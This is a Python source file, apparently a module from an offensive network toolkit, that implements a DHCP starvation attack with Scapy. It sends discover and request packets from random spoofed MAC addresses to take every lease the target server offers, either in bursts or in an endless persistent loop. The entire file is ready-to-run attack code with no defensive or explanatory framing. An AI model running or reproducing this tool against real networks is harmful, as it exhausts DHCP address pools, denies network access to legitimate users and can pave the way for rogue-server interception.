from scapy.all import Ether, IP, UDP, BOOTP, DHCP, sniff, sendp, RandMAC, mac2str
import argparse
import random
import time

def execute(args):
    """Execute DHCP starvation attack"""
    print(f"[DHCP Starvation] Starting attack on interface {args.interface}")
    
    try:
        target_server = args.target_server if args.target_server else None
        
        if args.persistent:
            print("[DHCP Starvation] Running in persistent mode")
            persistent_starvation(args.interface, target_server)
        else:
            print("[DHCP Starvation] Running in single-shot mode")
            starvation_attack(args.interface, target_server, args.count if args.count else 100)
        
        return True
        
    except Exception as e:
        print(f"[DHCP Starvation] Error: {e}")
        return False

def starvation_attack(interface, target_server=None, count=100):
    """Perform DHCP starvation attack"""
    print(f"[DHCP Starvation] Sending {count} DHCP requests")
    
    for i in range(count):
        fake_mac = RandMAC()
        
        dhcp_discover(fake_mac, interface)
        
        if not handle_dhcp_offer(interface, fake_mac, target_server):
            print(f"[DHCP Starvation] No offer received for request {i+1}")
        
        time.sleep(0.1)
    
    print("[DHCP Starvation] Attack completed")

def persistent_starvation(interface, target_server=None):
    """Run persistent DHCP starvation attack"""
    print("[DHCP Starvation] Starting persistent attack (Ctrl+C to stop)")
    
    try:
        while True:
            fake_mac = RandMAC()
            dhcp_discover(fake_mac, interface)
            
            if not handle_dhcp_offer(interface, fake_mac, target_server):
                print("[DHCP Starvation] No offer received, retrying...")
            
            time.sleep(1)
            
    except KeyboardInterrupt:
        print("[DHCP Starvation] Stopped by user")

def dhcp_discover(spoofed_mac, interface):
    """Send DHCP discover packet"""
    discover = (
        Ether(src=spoofed_mac, dst="ff:ff:ff:ff:ff:ff") /
        IP(src="0.0.0.0", dst="255.255.255.255") /
        UDP(sport=68, dport=67) /
        BOOTP(chaddr=mac2str(spoofed_mac), xid=random.randint(1, 1000000000)) /
        DHCP(options=[("message-type", "discover"), "end"])
    )
    
    sendp(discover, iface=interface, verbose=False)

def handle_dhcp_offer(interface, spoofed_mac, target_server=None):
    """Handle DHCP offer and send request"""
    offer = sniff(filter="udp and (port 67 or 68)", count=1, timeout=3, iface=interface)
    
    if not offer:
        return False
    
    if DHCP in offer[0] and offer[0][DHCP].options[0][1] == 2:
        server_ip = offer[0][IP].src
        if target_server and server_ip != target_server:
            return False
        
        offered_ip = offer[0][BOOTP].yiaddr
        
        dhcp_request(offered_ip, spoofed_mac, server_ip, interface)
        return True
    
    return False

def dhcp_request(req_ip, spoofed_mac, server_ip, interface):
    """Send DHCP request packet"""
    request = (
        Ether(src=spoofed_mac, dst="ff:ff:ff:ff:ff:ff") /
        IP(src="0.0.0.0", dst="255.255.255.255") /
        UDP(sport=68, dport=67) /
        BOOTP(chaddr=mac2str(spoofed_mac), xid=random.randint(1, 1000000000)) /
        DHCP(options=[
            ("message-type", "request"),
            ("server_id", server_ip),
            ("requested_addr", req_ip),
            "end"
        ])
    )
    
    sendp(request, iface=interface, verbose=False)
    print(f"[DHCP Starvation] Requested IP: {req_ip}")

def add_arguments(parser):
    """Add DHCP starvation specific arguments to parser"""
    parser.add_argument("--target-server", help="Target DHCP server IP address")
    parser.add_argument("--count", "-c", type=int, default=100, 
                       help="Number of DHCP requests to send")
    parser.add_argument("--persistent", "-p", action="store_true", 
                       help="Run in persistent mode")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="DHCP Starvation Attack")
    parser.add_argument("--interface", "-i", required=True, help="Network interface")
    parser.add_argument("--target-server", help="Target DHCP server IP address")
    parser.add_argument("--count", "-c", type=int, default=100, 
                       help="Number of DHCP requests to send")
    parser.add_argument("--persistent", "-p", action="store_true", 
                       help="Run in persistent mode")
    
    args = parser.parse_args()
    execute(args)